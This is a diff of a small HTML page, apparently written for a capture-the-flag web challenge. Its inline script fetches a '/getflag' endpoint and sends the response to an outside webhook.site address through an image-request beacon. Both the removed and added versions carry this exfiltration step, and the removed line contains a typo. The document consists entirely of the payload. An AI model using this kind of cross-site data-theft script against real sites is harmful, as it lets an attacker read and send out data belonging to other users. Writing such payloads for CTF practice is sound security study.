@@ -2,9 +2,13 @@
 <html>
   <body>
     <script>
-      fetch('http://chall.nckuctf.org:26002/getflag')
-        .then(r => r.text())
-        .then(flag => {mnew Image().src = 'https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a?flag=' + encodeURIComponent(flag); });
-    </script>
+  fetch('/getflag')
+    .then(r => r.text())
+    .then(f => {
+      alert("FLAG: " + f);
+      new Image().src = 'https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a?flag=' + encodeURIComponent(f);
+    });
+</script>
+
   </body>
 </html>
